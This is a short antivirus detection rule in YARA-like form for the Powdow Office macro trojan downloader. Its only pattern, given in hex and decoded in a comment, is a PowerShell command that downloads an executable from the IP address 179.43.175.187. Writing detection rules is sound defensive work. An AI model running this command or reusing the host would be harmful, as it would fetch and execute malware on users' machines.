
rule TrojanDownloader_O97M_Powdow_PKSH_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PKSH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {50 4f 57 45 52 73 68 45 6c 6c 2e 45 78 45 20 77 47 65 74 20 68 74 74 70 3a 2f 2f 31 37 39 2e 34 33 2e 31 37 35 2e 31 38 37 2f 7a 71 64 65 2f 4a 7a 71 6d 79 6e 62 2e 65 78 65 } //00 00  POWERshEll.ExE wGet http://179.43.175.187/zqde/Jzqmynb.exe
	condition:
		any of ($a_*)
 
}